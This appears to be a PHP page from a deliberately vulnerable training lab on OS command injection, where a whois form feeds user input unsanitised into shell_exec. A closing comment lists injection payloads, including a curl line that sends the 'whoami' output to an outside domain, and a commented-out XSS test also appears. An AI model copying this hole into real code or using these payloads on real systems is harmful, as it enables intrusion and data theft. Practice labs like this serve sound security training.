<?php
include_once "includer.php"; 

function checkInput($data)
{
    switch($_COOKIE['security_level'])
    {
        case "0" :        
            $data = no_check($data);            
            break;
        case "1" :
            $data = commandi_check_1($data);
            break;
        case "2" :                 
            $data = commandi_check_2($data);            
            break;
        default : 
            $data = no_check($data);            
            break;   
    }       
    return $data;
}


?>

<div class="container">
    <h1>OS Command Injection</h1>
    <!--<a href="#">okan <script>alert(1)</script> </a>-->

    <form action="<?php echo($_SERVER["SCRIPT_NAME"]);?>" method="POST">

        <p>

            <label for="target">Whois Lookup:</label>
            <input type="text" id="target" name="target" value="www.jotform.com">
            <button type="submit" name="form" value="submit">SEND</button>

        </p>

    </form>


<?php

if(isset($_POST["target"])){
    $target = $_POST["target"];

    if($target=="")
        echo "<font color='red'>Enter a target...</font>";
    else
        echo "<p align='left'>".shell_exec("nslookup ".checkInput($target))."</p>";

}

?>


</div>




<!--

oob->www.google.com; curl `whoami`.okanalan.engineer

Level 0 : www.google.com; ls
Level 1: www.google.com | ls
Level 2: 

-->